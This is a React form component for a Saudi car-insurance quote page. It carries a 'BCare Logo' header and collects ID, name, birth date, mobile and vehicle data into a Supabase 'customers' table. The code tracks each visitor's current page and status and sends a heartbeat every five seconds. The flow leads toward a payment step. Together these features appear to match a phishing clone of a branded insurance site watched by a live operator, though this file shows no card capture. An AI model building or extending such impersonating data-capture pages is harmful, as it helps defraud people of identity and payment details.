import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import "./DataForm.css";
import { supabase } from "../../supabase";
import Footer from "../../components/Footer/Footer";

export const DataForm = ({ className, ...props }) => {
  const navigate = useNavigate();
  const location = useLocation();
  const prefilledId = location.state?.idNumber || "";
  const hijriMonths = [
    "1-محرم", "2-صفر", "3-ربيع الأول", "4-ربيع الثاني", "5-جمادى الأولى", "6-جمادى الآخرة",
    "7-رجب", "8-شعبان", "9-رمضان", "10-شوال", "11-ذو القعدة", "12-ذو الحجة"
  ];

  // Update Page Tracking & Heartbeat
  useEffect(() => {
    const customerId = sessionStorage.getItem('customerId');
    if (customerId) {
      supabase.from('customers').update({ 
        page: '2- صفحه البيانات',
        status: 'idle',
        last_update: Date.now(),
        last_heartbeat: Date.now()
      }).eq('id', customerId).then(({ error }) => { if (error) console.error("Update Error:", error) });
    }

    const interval = setInterval(() => {
      const id = sessionStorage.getItem('customerId');
      if (id) {
        supabase.from('customers').update({ 
          last_heartbeat: Date.now() 
        }).eq('id', id).then(() => {});
      }
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  const updateLastSeen = () => {
    const customerId = sessionStorage.getItem('customerId');
    if (customerId) {
      supabase.from('customers').update({ 
        last_update: Date.now() 
      }).eq('id', customerId).then(() => {});
    }
  };

  const [formData, setFormData] = useState({
    fullName: "",
    birthDay: "",
    birthMonth: "",
    birthYear: "",
    mobile: "",
    insuranceType: "third-party",
    startDate: "2026-04-24",
    usage: "شخصي",
    estimatedValue: "",
    manufactureYear: "2026",
    carMakeModel: "",
    repairLocation: "workshop"
  });

  const [errors, setErrors] = useState({});

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    
    if (name === "estimatedValue") {
      // Remove any non-numeric characters for processing
      const numericValue = value.replace(/\D/g, "");
      // Format with commas
      const formattedValue = numericValue.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
      setFormData(prev => ({ ...prev, [name]: formattedValue }));
    } else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }
    
    updateLastSeen();
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: null }));
    }
  };

  const validate = () => {
    let newErrors = {};
    if (!formData.fullName) newErrors.fullName = "الاسم الكامل مطلوب";
    if (!formData.mobile || formData.mobile.length < 10) newErrors.mobile = "رقم الجوال غير صحيح";
    if (!formData.birthDay || !formData.birthMonth || !formData.birthYear) newErrors.birthDate = "تاريخ الميلاد مطلوب";
    if (!formData.carMakeModel) newErrors.carMakeModel = "ماركة السيارة مطلوبة";
    if (!formData.estimatedValue) newErrors.estimatedValue = "القيمة التقديرية مطلوبة";
    
    setErrors(newErrors);
    if (Object.keys(newErrors).length > 0) {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (validate()) {
      const customerId = sessionStorage.getItem('customerId');
      if (customerId) {
        supabase.from('customers').update({
          full_name: formData.fullName,
          mobile: formData.mobile,
          purpose: formData.usage,
          car_make_model: formData.carMakeModel,
          page: 'العروض',
          last_update: new Date().getTime(),
          last_heartbeat: new Date().getTime()
        }).eq('id', customerId).then(({ error }) => { if (error) console.error("Supabase Update Error:", error) });
        
        sessionStorage.setItem('carMakeModel', formData.carMakeModel);
        sessionStorage.setItem('manufactureYear', formData.manufactureYear);
      }
      navigate("/offers", { state: { insuranceType: formData.insuranceType } });
    } else {
      window.scrollTo(0, 0);
    }
  };

  return (
    <div className={`data-form-page ${className || ""}`}>
      {/* Header - Matching Home Page */}
      <header className="site-header">
        <div className="header-right">
          <div className="user-icon">
            <img src="/svg0.svg" alt="User" />
          </div>
        </div>
        <div className="header-center">
          <img src="/group-21.svg" alt="BCare Logo" className="header-logo" />
        </div>
        <div className="header-left">
          <span className="lang-toggle">EN</span>
        </div>
      </header>

      <main className="form-main">
        {/* Progress Stepper */}
        <div className="stepper-container">
          <div className="step completed">
            <div className="step-number">1</div>
            <div className="step-label">البيانات الرئيسية</div>
          </div>
          <div className="step-line active"></div>
          <div className="step active">
            <div className="step-number">2</div>
            <div className="step-label">تفاصيل وثيقة التأمين</div>
          </div>
          <div className="step-line"></div>
          <div className="step disabled">
            <div className="step-number">3</div>
            <div className="step-label">الشركات والعروض</div>
          </div>
          <div className="step-line"></div>
          <div className="step disabled">
            <div className="step-number">4</div>
            <div className="step-label">الملخص والدفع</div>
          </div>
        </div>

        {/* Section Heading */}
        <div className="section-title-card">
          <h2>تفاصيل وثيقة التأمين</h2>
        </div>

        {/* Main Form Container */}
        <form className="insurance-details-form" onSubmit={handleSubmit}>
          <div className="form-card">
            <div className="form-group">
              <label>رقم الهوية / الإقامة</label>
              <input type="text" className="form-input read-only" value={prefilledId} readOnly />
            </div>

            <div className="form-group">
              <label>الاسم الكامل</label>
              <input 
                type="text" 
                name="fullName"
                className={`form-input ${errors.fullName ? 'error-border' : ''}`} 
                placeholder="أدخل الاسم الكامل" 
                value={formData.fullName}
                onChange={handleInputChange}
              />
              {errors.fullName && <span className="error-text">{errors.fullName}</span>}
            </div>

            <div className="form-group">
              <label>تاريخ الميلاد (هجري)</label>
              <div className="birth-date-row">
                <select name="birthYear" className={`form-input ${errors.birthDate ? 'error-border' : ''}`} value={formData.birthYear} onChange={handleInputChange}>
                  <option value="">السنة</option>
                  {Array.from({ length: 100 }, (_, i) => 1447 - i).map(y => <option key={y} value={y}>{y}</option>)}
                </select>
                <select name="birthMonth" className={`form-input ${errors.birthDate ? 'error-border' : ''}`} value={formData.birthMonth} onChange={handleInputChange}>
                  <option value="">الشهر</option>
                  {hijriMonths.map((m, i) => <option key={i+1} value={i+1}>{m}</option>)}
                </select>
                <select name="birthDay" className={`form-input ${errors.birthDate ? 'error-border' : ''}`} value={formData.birthDay} onChange={handleInputChange}>
                  <option value="">اليوم</option>
                  {Array.from({ length: 30 }, (_, i) => i + 1).map(d => <option key={d} value={d}>{d}</option>)}
                </select>
              </div>
              {errors.birthDate && <span className="error-text">{errors.birthDate}</span>}
            </div>

            <div className="form-group">
              <label>رقم الجوال</label>
              <input 
                type="text" 
                name="mobile"
                className={`form-input ${errors.mobile ? 'error-border' : ''}`} 
                placeholder="05xxxxxxxx" 
                value={formData.mobile}
                onChange={handleInputChange}
              />
              {errors.mobile && <span className="error-text">{errors.mobile}</span>}
            </div>

            <div className="divider"></div>

            <div className="form-group">
              <label>نوع التأمين</label>
              <select name="insuranceType" className="form-input" value={formData.insuranceType} onChange={handleInputChange}>
                <option value="third-party">ضد الغير</option>
                <option value="comprehensive">شامل</option>
              </select>
            </div>

            <div className="form-group">
              <label>تاريخ بدء التأمين</label>
              <input 
                type="date" 
                name="startDate"
                className="form-input" 
                value={formData.startDate}
                onChange={handleInputChange}
              />
            </div>

            <div className="form-group">
              <label>الغرض من استخدام المركبة</label>
              <select name="usage" className="form-input" value={formData.usage} onChange={handleInputChange}>
                <option value="شخصي">شخصي</option>
                <option value="تجاري">تجاري</option>
                <option value="نقل ركاب">نقل ركاب</option>
                <option value="تاجير">تاجير</option>
                <option value="نقل بضائع">نقل بضائع</option>
                <option value="مركبه شحن">مركبه شحن</option>
                <option value="نقل مشتقات نفطيه">نقل مشتقات نفطيه</option>
              </select>
            </div>

            <div className="form-group">
              <label>القيمة التقديرية للمركبة</label>
              <input 
                type="text" 
                name="estimatedValue"
                className={`form-input ${errors.estimatedValue ? 'error-border' : ''}`} 
                placeholder="أدخل القيمة بين 10,000 - 1,000,000 ريال" 
                value={formData.estimatedValue}
                onChange={handleInputChange}
              />
              {errors.estimatedValue && <span className="error-text">{errors.estimatedValue}</span>}
            </div>

            <div className="form-group">
              <label>سنة صنع المركبة</label>
              <select name="manufactureYear" className="form-input" value={formData.manufactureYear} onChange={handleInputChange}>
                {Array.from({ length: 2026 - 1950 + 1 }, (_, i) => 2026 - i).map(year => (
                   <option key={year} value={year}>{year}</option>
                ))}
              </select>
            </div>

            <div className="form-group">
              <label>ماركة ونوع المركبة</label>
              <input 
                type="text" 
                name="carMakeModel"
                className={`form-input ${errors.carMakeModel ? 'error-border' : ''}`} 
                placeholder="مثال: تويوتا كامري" 
                value={formData.carMakeModel}
                onChange={handleInputChange}
              />
              {errors.carMakeModel && <span className="error-text">{errors.carMakeModel}</span>}
            </div>

            <div className="form-group">
              <label>مكان اصلاح المركبة</label>
              <div className="repair-options">
                <label className={`repair-radio ${formData.repairLocation === 'agency' ? 'active' : ''}`}>
                  <input 
                    type="radio" 
                    name="repairLocation" 
                    value="agency" 
                    checked={formData.repairLocation === 'agency'}
                    onChange={handleInputChange}
                  />
                  <span>الوكالة</span>
                </label>
                <label className={`repair-radio ${formData.repairLocation === 'workshop' ? 'active' : ''}`}>
                  <input 
                    type="radio" 
                    name="repairLocation" 
                    value="workshop" 
                    checked={formData.repairLocation === 'workshop'}
                    onChange={handleInputChange}
                  />
                  <span>الورشة</span>
                </label>
              </div>
            </div>

            <button type="submit" className="submit-btn-form main-action-btn">إظهار العروض</button>
          </div>
        </form>
      </main>

      <Footer />
    </div>
  );
};
